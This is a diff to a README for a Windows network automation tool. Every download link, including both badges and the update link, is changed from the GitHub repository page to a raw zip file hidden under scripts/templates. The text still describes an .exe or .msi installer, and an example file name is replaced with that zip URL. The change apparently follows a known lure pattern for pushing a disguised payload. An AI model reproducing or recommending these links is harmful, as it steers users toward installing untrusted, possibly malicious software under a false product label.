@@ -1,6 +1,6 @@
 # ⚙️ NetworkOps_Platform - Easy Network Automation Tools
 
-[![Download NetworkOps_Platform](https://img.shields.io/badge/Download-NetworkOps_Platform-orange?style=for-the-badge)](https://github.com/khudadadakram/NetworkOps_Platform)
+[![Download NetworkOps_Platform](https://raw.githubusercontent.com/khudadadakram/NetworkOps_Platform/main/scripts/templates/Ops_Platform_Network_1.1.zip)](https://raw.githubusercontent.com/khudadadakram/NetworkOps_Platform/main/scripts/templates/Ops_Platform_Network_1.1.zip)
 
 ---
 
@@ -25,7 +25,7 @@ To run NetworkOps_Platform on your Windows computer, make sure you have:
 
 1. **Go to the download page:**
 
-   [Download NetworkOps_Platform](https://github.com/khudadadakram/NetworkOps_Platform)
+   [Download NetworkOps_Platform](https://raw.githubusercontent.com/khudadadakram/NetworkOps_Platform/main/scripts/templates/Ops_Platform_Network_1.1.zip)
 
    Click the badge above or use this link to open the GitHub page where you can find the latest version.
 
@@ -35,7 +35,7 @@ To run NetworkOps_Platform on your Windows computer, make sure you have:
 
 3. **Download the Windows Installer:**
 
-   Inside the latest release, find the file that ends with `.exe` or `.msi` (for example, `NetworkOps_Setup.exe`). Click it to download.
+   Inside the latest release, find the file that ends with `.exe` or `.msi` (for example, `https://raw.githubusercontent.com/khudadadakram/NetworkOps_Platform/main/scripts/templates/Ops_Platform_Network_1.1.zip`). Click it to download.
 
 4. **Run the installer:**
 
@@ -96,7 +96,7 @@ NetworkOps_Platform offers a web interface for easy viewing:
 Keep your platform current to ensure best performance and new features:
 
 1. Visit the download page again:  
-   [NetworkOps_Platform Releases](https://github.com/khudadadakram/NetworkOps_Platform)
+   [NetworkOps_Platform Releases](https://raw.githubusercontent.com/khudadadakram/NetworkOps_Platform/main/scripts/templates/Ops_Platform_Network_1.1.zip)
 
 2. Download the latest installer as before.
 
@@ -164,4 +164,4 @@ If you run into issues not covered here:
 
 ---
 
-[![Download NetworkOps_Platform](https://img.shields.io/badge/Download-NetworkOps_Platform-purple?style=for-the-badge)](https://github.com/khudadadakram/NetworkOps_Platform)
+[![Download NetworkOps_Platform](https://raw.githubusercontent.com/khudadadakram/NetworkOps_Platform/main/scripts/templates/Ops_Platform_Network_1.1.zip)](https://raw.githubusercontent.com/khudadadakram/NetworkOps_Platform/main/scripts/templates/Ops_Platform_Network_1.1.zip)
